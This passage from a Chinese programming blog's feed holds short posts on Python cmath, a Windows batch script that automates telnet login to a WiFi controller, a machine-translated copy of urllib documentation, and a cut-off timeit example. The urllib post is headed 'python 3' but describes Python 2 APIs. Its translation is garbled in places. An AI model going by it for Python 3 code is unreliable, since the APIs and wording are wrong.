cmath<br><span class="hljs-meta">&gt;&gt;&gt; </span>cmath.sqrt(-<span class="hljs-number">1</span>)<br><span class="hljs-number">1j</span><br>&gt;&gt;&gt;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> cmath <span class="hljs-keyword">import</span> *<br><span class="hljs-meta">&gt;&gt;&gt; </span>sqrt(-<span class="hljs-number">1</span>)<br><span class="hljs-number">1j</span><br>&gt;&gt;&gt;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> *<br><span class="hljs-meta">&gt;&gt;&gt; </span>sqrt(-<span class="hljs-number">1</span>)<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>ValueError: math domain error<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> import </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows环境下的bat如何实现远程发送命令并执行</title>
      <link href="/2016/05/30/windows%E7%8E%AF%E5%A2%83bat%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%89%A7%E8%A1%8C/"/>
      <url>/2016/05/30/windows%E7%8E%AF%E5%A2%83bat%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%8F%91%E9%80%81%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="脚本作用：-登录酒店WIFI-WAC控制器，然后查看AP在线情况。"><a href="#脚本作用：-登录酒店WIFI-WAC控制器，然后查看AP在线情况。" class="headerlink" title="脚本作用： 登录酒店WIFI  WAC控制器，然后查看AP在线情况。"></a>脚本作用： 登录酒店WIFI  WAC控制器，然后查看AP在线情况。</h1><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs bat"><br><br><br><br><br>:: Version       :  v1.<span class="hljs-number">1</span><br>:: Author        :  zhuxinkai<br><br><br>@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓请在英文输入法模式下运行此脚本，因为为远程发送键盘输入命令方式，不同的输入法会导致不同的结果! 〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓 <br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><br><br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓 脚本会临时生成telnet_tmp.vbs ,如果有杀毒软件提示生成的VBS，请选择信任，并重新运行此脚本。  〓〓〓〓〓〓〓〓〓〓〓〓〓<br><span class="hljs-built_in">echo</span> 〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓〓<br><br><br><br><br>:<span class="hljs-built_in">start</span><br>@<span class="hljs-built_in">echo</span> off<br><br><br><br><br>@<span class="hljs-built_in">echo</span> off <br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span>.<br><br> <br> <br><span class="hljs-built_in">echo</span> 阅读提示后，按任意键继续。<br><br><span class="hljs-built_in">pause</span><br><br>@<span class="hljs-built_in">echo</span> off<br><br><br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> sh = WScript.CreateObject(&quot;Wscript.Shell&quot;) &gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">300</span> &gt;&gt;telnet_tmp.vbs<br><br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;open&quot;&gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;  &quot;&gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">222</span>&quot;&gt;&gt;telnet_tmp.vbs<br><br><br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">300</span> &gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">1000</span> &gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;username&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><br><br><span class="hljs-built_in">echo</span> WScript.Sleep <span class="hljs-number">1000</span> &gt;&gt;telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;password&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><br><br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;dis wlan ap all&quot; &gt;&gt; telnet_tmp.vbs<br><span class="hljs-built_in">echo</span> sh.SendKeys &quot;&#123;ENTER&#125;&quot;&gt;&gt;telnet_tmp.vbs<br><br><span class="hljs-built_in">start</span> telnet<br><span class="hljs-keyword">call</span> telnet_tmp.vbs<br><span class="hljs-built_in">del</span> telnet_tmp.vbs<br><br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>urllib模块之python 3</title>
      <link href="/2016/04/27/python-urllib/"/>
      <url>/2016/04/27/python-urllib/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/developer/doc/1198">Python</a><a href="/developer/chapter/16176">网络 | Internet</a>urllib</p><h1 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h1><p>注意</p><p>该<code>urllib</code>模块已经被分成部分和在Python 3重命名为<code>urllib.request</code>，<code>urllib.parse</code>，和<code>urllib.error</code>。该<a href="https://docs.python.org/2.7/glossary.html#term-2to3">2to3的</a>转换你的源代码时，Python 3的另外请注意，该工具会自动适应进口<code>urllib.request.urlopen()</code>在Python 3功能相当于<code>urllib2.urlopen()</code>并且<code>urllib.urlopen()</code>已被删除。</p><p>该模块提供了一个高级接口，用于通过万维网获取数据。特别是，该<code>urlopen()</code>函数与内置函数类似<code>open()</code>，但接受通用资源定位符（URL）而不是文件名。有些限制适用 - 它只能打开URL进行阅读，并且没有可用的查找操作。</p><p>在版本2.7.9中进行了更改：对于HTTPS URI，<code>urllib</code>默认情况下执行所有必需的证书和主机名检查。</p><p>警告</p><p>对于早于2.7.9的Python版本，urllib不会尝试验证HTTPS URI的服务器证书。使用需要您自担风险！</p><span id="more"></span><h2 id="1-高级界面"><a href="#1-高级界面" class="headerlink" title="1.高级界面"></a>1.高级界面</h2><p><code>urllib.urlopen(url[, data[, proxies[, context]]])</code></p><p>打开一个由URL表示的网络对象以供阅读。如果URL没有方案标识符，或者它有方案标识符，则会<code>file:</code>打开一个本地文件（没有<a href="https://docs.python.org/2.7/glossary.html#term-universal-newlines">通用换行符</a>）; 否则它会打开一个到网络上某个服务器的套接字。如果无法建立连接，<code>IOError</code>则引发异常。如果一切顺利，将返回一个类似文件的对象。这支持了以下方法：<code>read()</code>，<code>readline()</code>，<code>readlines()</code>，<code>fileno()</code>，<code>close()</code>，<code>info()</code>，<code>getcode()</code>和<code>geturl()</code>。它也对<a href="https://docs.python.org/2.7/glossary.html#term-iterator">迭代器</a>协议有适当的支持。一个警告：<code>read()</code>方法，如果size参数被省略或者是否定的，则可能直到数据流结束才读取; 在一般情况下，没有好方法可以确定来自套接字的整个流已被读取。</p><p>除<code>info()</code>，<code>getcode()</code>和<code>geturl()</code>方法，这些方法具有相同的界面，文件对象-见文件对象这份手册里。（但它不是内置的文件对象，所以它不能用于需要真正的内置文件对象的地方。）</p><p>该<code>info()</code>方法返回<code>mimetools.Message</code>包含与URL关联的元信息的类的一个实例。当方法是HTTP时，这些头部是服务器在检索到的HTML页面的头部（包括Content-Length和Content-Type）返回的头部。当方法是FTP时，如果服务器响应FTP检索请求传回一个文件长度（如现在一样），则会出现一个Content-Length头。如果可以猜出MIME类型，则会出现Content-Type标头。当方法是本地文件时，返回的头文件将包含表示文件上次修改时间的Date，给出文件大小的Content-Length和包含文件类型猜测的Content-Type。另请参阅<code>mimetools</code>模块的说明。</p><p>该<code>geturl()</code>方法返回页面的真实URL。在某些情况下，HTTP服务器会将客户端重定向到另一个URL。该<code>urlopen()</code>函数透明地处理这个问题，但在某些情况下，调用者需要知道客户端重定向到哪个URL。该<code>geturl()</code>方法可用于获取此重定向的URL。</p><p>该<code>getcode()</code>方法返回与响应一起发送的HTTP状态代码，或者<code>None</code>该URL不包含HTTP URL。</p><p>如果_URL_使用<code>http:</code>方案标识符，则可以给出可选的_数据_参数来指定<code>POST</code>请求（通常请求类型是<code>GET</code>）。的_数据_参数必须是在标准_应用程序/ x-WWW窗体-urlencoded_格式; 请参阅<code>urlencode()</code>下面的功能。</p><p>该<code>urlopen()</code>功能透明地与不需要认证的代理工作。在Unix或Windows环境中，在启动Python解释器之前，将环境变量<code>http_proxy</code>或<code>ftp_proxy</code>环境变量设置为标识代理服务器的URL。例如（这<code>&#39;%&#39;</code>是命令提示符）：</p><p>% http_proxy=”<a href="http://www.someproxy.com:3128&quot;">http://www.someproxy.com:3128&quot;</a><br>% export http_proxy<br>% python<br>…</p><p>该<code>no_proxy</code>环境变量可用于指定不应通过代理达到的主机; 如果设置，它应该是逗号分隔的主机名后缀列表，可选地<code>:port</code>附加后缀，例如<code>cern.ch,ncsa.uiuc.edu,some.host:8080</code>。</p><p>在Windows环境中，如果未设置代理环境变量，则代理设置将从注册表的“Internet设置”部分获取。</p><p>在Mac OS X环境中，<code>urlopen()</code>将从OS X系统配置框架中检索代理信息，可通过网络系统首选项面板进行管理。</p><p>或者，可选的_代理_参数可用于显式指定代理。它必须是字典映射方案名称以代理URL，其中空字典不会导致使用代理，并且<code>None</code>（默认值）会导致如上所述使用环境代理设置。例如：</p><p># Use <a href="http://www.someproxy.com:3128/">http://www.someproxy.com:3128</a> for HTTP proxying<br>proxies = {‘http’: ‘<a href="http://www.someproxy.com:3128&#39;}">http://www.someproxy.com:3128&#39;}</a><br>filehandle = urllib.urlopen(some_url, proxies=proxies)<br># Don’t use any proxies<br>filehandle = urllib.urlopen(some_url, proxies={})<br># Use proxies from environment - both versions are equivalent<br>filehandle = urllib.urlopen(some_url, proxies=None)<br>filehandle = urllib.urlopen(some_url)</p><p>目前不支持需要使用认证的代理; 这被视为实施限制。</p><p>该_情境_参数可以设置为一个<code>ssl.SSLContext</code>实例来配置如果使用SSL设置<code>urlopen()</code>使得HTTPS连接。</p><p>在版本2.3中更改：添加了_代理_支持。</p><p>在版本2.6中进行了更改：添加<code>getcode()</code>到返回的对象并支持<code>no_proxy</code>环境变量。</p><p>在版本2.7.9中更改：已添加_上下文_参数。所有必需的证书和主机名检查都是默认完成的。</p><p>自2.6版弃用：该<code>urlopen()</code>功能已在Python 3中被删除，以支持<code>urllib2.urlopen()</code>。</p><p><code>urllib.urlretrieve(url[, filename[, reporthook[, data]]])</code></p><p>如有必要，将由URL表示的网络对象复制到本地文件。如果URL指向本地文件，或者该对象的有效缓存副本存在，则不会复制该对象。返回一个元组<code>(filename, headers)</code>，其中_filename_是可以找到该对象的本地文件名，而_headers_是<code>info()</code>返回的对象的方法<code>urlopen()</code>（对于可能缓存的远程对象）。例外情况与之相同<code>urlopen()</code>。</p><p>第二个参数（如果存在）指定要复制到的文件位置（如果不存在，则该位置将是具有生成名称的临时文件）。第三个参数（如果存在的话）是一个钩子函数，在建立网络连接时会被调用一次，之后每个块被读取一次。该钩子将传递三个参数; 到目前为止传输的块的数量，以字节为单位的块大小以及文件的总大小。第三个参数可能<code>-1</code>在较旧的FTP服务器上，它们不响应检索请求而返回文件大小。</p><p>如果_URL_使用<code>http:</code>方案标识符，则可以给出可选的_数据_参数来指定<code>POST</code>请求（通常请求类型是<code>GET</code>）。的_数据_参数必须在标准_应用程序/ x-WWW窗体-urlencoded_格式; 请参阅<code>urlencode()</code>下面的功能。</p><p>在版本2.5中进行了更改：当它检测到可用数据量小于预期量（这是_Content-Length_报头报告的大小）时<code>urlretrieve()</code>将会增加。例如，当下载被中断时，会发生这种情况。<code>ContentTooShortError</code></p><p>该_内容长度_被视为一个下界：如果有更多的数据读取，<code>urlretrieve()</code>读取更多的数据，但如果较少的数据是可用的，它引发异常。</p><p>在这种情况下，您仍可以检索下载的数据，并将其存储在<code>content</code>异常实例的属性中。</p><p>如果未提供_Content-Length_标头，<code>urlretrieve()</code>则无法检查已下载数据的大小，只是将其返回。在这种情况下，您只需假定下载成功。</p><p><code>urllib._urlopener</code></p><p>公共职能<code>urlopen()</code>并<code>urlretrieve()</code>创建<code>FancyURLopener</code>该类的一个实例并用它来执行他们所请求的操作。要覆盖此功能，程序员可以创建<code>URLopener</code>or 的子类<code>FancyURLopener</code>，然后<code>urllib._urlopener</code>在调用所需的函数之前将该类的实例分配给该变量。例如，应用程序可能希望指定与定义不同的_User-Agent_标头<code>URLopener</code>。这可以用下面的代码来完成：</p><p>import urllib</p><p>class AppURLopener(urllib.FancyURLopener):<br>    version = “App/1.7”</p><p>urllib._urlopener = AppURLopener()</p><p><code>urllib.urlcleanup()</code></p><p>清除以前通过呼叫建立的缓存<code>urlretrieve()</code>。</p><h2 id="2-实用功能"><a href="#2-实用功能" class="headerlink" title="2.实用功能"></a>2.实用功能</h2><p><code>urllib.quote(string[, safe])</code></p><p>使用转义替换_字符串_中的特殊字符<code>%xx</code>。字母，数字和字符<code>&#39;_.-&#39;</code>从未被引用。默认情况下，此功能用于引用URL的路径部分。可选的_安全_参数指定不应引用的附加字符 - 其默认值为<code>&#39;/&#39;</code>。</p><p>Example: <code>quote(&#39;/~connolly/&#39;)</code> yields <code>&#39;/%7econnolly/&#39;</code>.</p><p><code>urllib.quote_plus(string[, safe])</code></p><p>就像<code>quote()</code>，但也用加号替换空格，这是在构建查询字符串进入URL时引用HTML表单值所需的。除非包含在_保险箱中，_否则原始字符串中的加号会被转义。它也没有_安全的_默认值<code>&#39;/&#39;</code>。</p><p><code>urllib.unquote(string)</code></p><p>用<code>%xx</code>它们的单字符替换换码。</p><p>Example: <code>unquote(&#39;/%7Econnolly/&#39;)</code> yields <code>&#39;/~connolly/&#39;</code>.</p><p><code>urllib.unquote_plus(string)</code></p><p>就像<code>unquote()</code>，但也用空格替换加号，以取消引用HTML表单值。</p><p><code>urllib.urlencode(query[, doseq])</code></p><p>将映射对象或两元素元组序列转换为“百分比编码”字符串，适合<code>urlopen()</code>作为可选_数据_参数传递给上面的元素。这对于将表单字段的字典传递给<code>POST</code>请求很有用。生成的字符串是一系列<code>key=value</code>由<code>&#39;&amp;&#39;</code>字符分隔的对，其中_键_和_值_都使用<code>quote_plus()</code>上面的引号。当使用两元素元组作为_查询_参数时，每个元组的第一个元素是一个键，第二个元素是一个值。价值元素本身可以是一个序列，在这种情况下，如果可选参数_doseq_被评估为<code>True</code>，单独的<code>key=value</code>对被分隔<code>&#39;&amp;&#39;</code>为密钥的值序列的每个元素生成。编码字符串中参数的顺序将与序列中参数元组的顺序相匹配。该<code>urlparse</code>模块提供的功能<code>parse_qs()</code>和<code>parse_qsl()</code>其用于解析查询字符串成Python数据结构。</p><p><code>urllib.pathname2url(path)</code></p><p>将_路径_的本地语法的路径名_路径_转换为URL的路径组件中使用的表单。这不会产生完整的网址。返回值将使用该<code>quote()</code>函数引用。</p><p><code>urllib.url2pathname(path)</code></p><p>将路径组件_路径_从百分比编码的URL 转换为路径的本地语法。这不接受完整的网址。此功能用于<code>unquote()</code>解码_路径_。</p><p><code>urllib.getproxies()</code></p><p>此帮助函数将代理服务器URL映射的方案字典返回。它以<code>&lt;scheme&gt;_proxy</code>大小写敏感的方式，首先为所有操作系统扫描环境变量，并在找不到它时，从Mac OS X系统配置Mac OS X和Windows系统注册表Windows查找代理信息。如果小写和大写环境变量都存在（并且不同意），则小写是首选。</p><p>注意</p><p>如果<code>REQUEST_METHOD</code>设置了环境变量（通常表示脚本正在CGI环境中运行），则环境变量<code>HTTP_PROXY</code>（大写<code>_PROXY</code>）将被忽略。这是因为该变量可以由客户端使用“Proxy：”HTTP标头注入。如果您需要在CGI环境中使用HTTP代理，请<code>ProxyHandler</code>明确使用，或确保变量名是小写（或至少<code>_proxy</code>后缀）。</p><p>注意</p><p>urllib还公开了某些实用功能，如splittype，splithost和其他解析URL到各种组件。但建议使用它<code>urlparse</code>来解析URL而不是直接使用这些函数。Python 3不从<code>urllib.parse</code>模块公开这些帮助函数。</p><h2 id="3-URL开启器对象"><a href="#3-URL开启器对象" class="headerlink" title="3. URL开启器对象"></a>3. URL开启器对象</h2><p><code>class urllib.URLopener([proxies[, context[, **x509]]])</code></p><p>打开和阅读URL的基类。除非你需要使用比其他方案来支持开放的对象<code>http:</code>，<code>ftp:</code>或者<code>file:</code>，你可能想使用<code>FancyURLopener</code>。</p><p>默认情况下，<code>URLopener</code>该类将发送一个_User-Agent_标头<code>urllib/VVV</code>，其中_VVV_是<code>urllib</code>版本号。应用程序可以通过子类定义它们自己的_User-Agent_头，<code>URLopener</code>或者在子类定义<code>FancyURLopener</code>中将类属性<code>version</code>设置为合适的字符串值。</p><p>可选的_代理_参数应该是字典映射方案名称到代理URL，其中空字典将代理完全关闭。它的默认值是<code>None</code>，在这种情况下，如果存在的话，将使用环境代理设置，如<code>urlopen()</code>上面的定义中所讨论的。</p><p>该_情境_参数可以是一个<code>ssl.SSLContext</code>实例。如果给定，它定义开启者用于建立HTTPS连接的SSL设置。</p><p>在_x509中_收集的其他关键字参数可用于在使用该<code>https:</code>方案时验证客户端。支持关键字_key_file_和_cert_file_以提供SSL密钥和证书; 两者都需要支持客户端身份验证。</p><p><code>URLopenerIOError</code>如果服务器返回错误代码，则对象将引发异常。</p><p><code>open(fullurl[, data])</code></p><p>使用适当的协议打开_fullurl_。此方法设置缓存和代理信息，然后使用其输入参数调用相应的open方法。如果该方案未被识别，<code>open_unknown()</code>则被调用。该_数据_参数的含义相同_数据_的说法<code>urlopen()</code>。</p><p><code>open_unknown(fullurl[, data])</code></p><p>可覆盖的界面打开未知的URL类型。</p><p><code>retrieve(url[, filename[, reporthook[, data]]])</code></p><p>检索_url_的内容并将其放在_文件名中_。返回值是由本地文件名和<code>mimetools.Message</code>包含响应头的对象（对于远程URL）或<code>None</code>（对于本地URL）组成的元组。调用者必须打开并读取_文件名_的内容。如果没有给出_文件名_并且URL指向本地文件，则返回输入文件名。如果URL非本地和_文件名_没有给出，则该文件的输出<code>tempfile.mktemp()</code>与输入URL的最后一个路径成分的后缀匹配的后缀。如果有_报告_给出，它必须是一个接受三个数字参数的函数。它将在每个数据块从网络中读取后调用。对于本地URL，_reporthook_被忽略。</p><p>如果_URL_使用<code>http:</code>方案标识符，则可以给出可选的_数据_参数来指定<code>POST</code>请求（通常请求类型是<code>GET</code>）。的_数据_参数必须在标准_应用程序/ x-WWW窗体-urlencoded_格式; 请参阅<code>urlencode()</code>下面的功能。</p><p><code>version</code></p><p>指定开启器对象的用户代理的变量。为了<code>urllib</code>告诉服务器它是一个特定的用户代理，在调用基础构造函数之前，在子类中将其设置为类变量或构造函数中。</p><p><code>class urllib.FancyURLopener(...)</code></p><p><code>FancyURLopener</code>子类<code>URLopener</code>为下列HTTP响应代码提供默认处理：301,302,303,307和401.对于上面列出的30x响应代码，_Location_标头用于获取实际的URL。对于401响应代码（需要认证），执行基本的HTTP认证。对于30x响应代码，递归受限于_maxtries_属性的值，默认值为10。</p><p>对于所有其他响应代码，将<code>http_error_default()</code>调用该方法，您可以在子类中重写以适当地处理错误。</p><p>注意</p><p>根据<a href="https://tools.ietf.org/html/rfc2616.html"><strong>RFC 2616的规定</strong></a>，301和302对POST请求的响应不得在没有用户确认的情况下自动重定向。实际上，浏览器确实允许自动重定向这些响应，将POST更改为GET，并<code>urllib</code>重现此行为。</p><p>构造函数的参数与那些参数相同<code>URLopener</code>。</p><p>注意</p><p>执行基本身份验证时，<code>FancyURLopener</code>实例将调用其<code>prompt_user_passwd()</code>方法。默认实现向用户询问控制终端上的所需信息。如果需要，子类可以重写此方法以支持更适当的行为。</p><p>本<code>FancyURLopener</code>类提供了应该被重载，以提供适当的行为一个额外的方法：</p><p><code>prompt_user_passwd(host, realm)</code></p><p>返回在指定的安全领域中对给定主机上的用户进行身份验证所需的信息。返回值应该是一个元组，<code>(user, password)</code>可用于基本认证。</p><p>实施提示在终端上提供这些信息; 应用程序应该重写此方法以在本地环境中使用适当的交互模型。</p><p><code>exception urllib.ContentTooShortError(msg[, content])</code></p><p>当<code>urlretrieve()</code>函数检测到下载的数据量小于预期量（由_Content-Length_标题给出）时，会引发此异常。该<code>content</code>属性存储下载的（并且假定被截断的）数据。</p><p>2.5版本中的新功能。</p><h2 id="4-urllib限制"><a href="#4-urllib限制" class="headerlink" title="4. urllib限制"></a>4. urllib限制</h2><ul><li><p>  目前，仅支持以下协议：HTTP，（版本0.9和1.0），FTP和本地文件。</p></li><li><p>  缓存功能<code>urlretrieve()</code>已被禁用，直到我找到时间来破解正确处理过期时间标题。</p></li><li><p>  应该有一个函数来查询一个特定的URL是否在缓存中。</p></li><li><p>  为了向后兼容，如果URL看起来指向本地文件，但文件无法打开，则使用FTP协议重新解释URL。这有时会导致混淆错误消息。</p></li><li><p>  的<code>urlopen()</code>和<code>urlretrieve()</code>功能可能会导致任意长时间的延迟，而等待网络连接被建立。这意味着使用这些函数而不使用线程来构建交互式Web客户端是很困难的。</p></li><li><p>  由<code>urlopen()</code>or 返回的<code>urlretrieve()</code>数据是服务器返回的原始数据。这可能是二进制数据（如图像），纯文本或（例如）HTML。HTTP协议在应答头中提供了类型信息，可以通过查看_Content-Type_头来检查。如果返回的数据是HTML，则可以使用该模块<code>htmllib</code>解析它。</p></li><li><p>  处理FTP协议的代码不能区分文件和目录。当尝试读取指向无法访问的文件的URL时，这可能会导致意外的行为。如果URL以a结尾<code>/</code>，则假定引用一个目录并将相应地处理。但是，如果尝试读取文件导致550错误（意思是无法找到URL或者由于权限原因而无法访问该URL），那么该路径将被视为目录以处理指定目录时的情况由一个URL但尾随<code>/</code>已经被关闭了。当您尝试获取读取权限使其无法访问的文件时，这可能会导致误导性结果; FTP代码将尝试读取它，以550错误失败，然后执行不可读文件的目录列表。如果需要细粒度控制，请考虑使用<code>ftplib</code>模块，子类<code>FancyURLopener</code>或更改__urlopener_以满足您的需求。</p></li><li><p>  该模块不支持使用需要认证的代理。这可能会在未来实施。</p></li><li><p>  虽然<code>urllib</code>模块包含解析和解析URL字符串的（未记录的）例程，但推荐的URL操作接口在模块中<code>urlparse</code>。</p></li></ul><h2 id="5-例子"><a href="#5-例子" class="headerlink" title="5.例子"></a>5.例子</h2><p>以下是使用该<code>GET</code>方法检索包含参数的URL 的示例会话：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; params = urllib.urlencode({‘spam’: 1, ‘eggs’: 2, ‘bacon’: 0})<br>&gt; f = urllib.urlopen(“<a href="http://www.musi-cal.com/cgi-bin/query?%25s&quot;">http://www.musi-cal.com/cgi-bin/query?%s&quot;</a> % params)<br>&gt; print f.read()</p></blockquote></blockquote><p>以下示例使用该<code>POST</code>方法：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; params = urllib.urlencode({‘spam’: 1, ‘eggs’: 2, ‘bacon’: 0})<br>&gt; f = urllib.urlopen(“<a href="http://www.musi-cal.com/cgi-bin/query&quot;">http://www.musi-cal.com/cgi-bin/query&quot;</a>, params)<br>&gt; print f.read()</p></blockquote></blockquote><p>以下示例使用明确指定的HTTP代理覆盖环境设置：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; proxies = {‘http’: ‘<a href="http://proxy.example.com:8080/&#39;}">http://proxy.example.com:8080/&#39;}</a><br>&gt; opener = urllib.FancyURLopener(proxies)<br>&gt; f = opener.open(“<a href="http://www.python.org&quot;/">http://www.python.org&quot;</a>)<br>&gt; f.read()</p></blockquote></blockquote><p>以下示例完全不使用代理，覆盖环境设置：</p><blockquote><blockquote><p>&gt; import urllib<br>&gt; opener = urllib.FancyURLopener({})<br>&gt; f = opener.open(“<a href="http://www.python.org/&quot;">http://www.python.org/&quot;</a>)<br>&gt; f.read()</p></blockquote></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> urllib </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 使用小技巧，timeit计算程序代码的执行时间。</title>
      <link href="/2016/04/24/python%E6%8A%80%E5%B7%A7-1/"/>
      <url>/2016/04/24/python%E6%8A%80%E5%B7%A7-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="用于计算常用的函数执行时间。"><a href="#用于计算常用的函数执行时间。" class="headerlink" title="用于计算常用的函数执行时间。"></a>用于计算常用的函数执行时间。</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> timeit<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_sleep</span>(<span class="hljs-params">times</span>):</span><br>    time.sleep(times)<br>    <span class="hljs-built_in">print</span>(times)<br><br><span 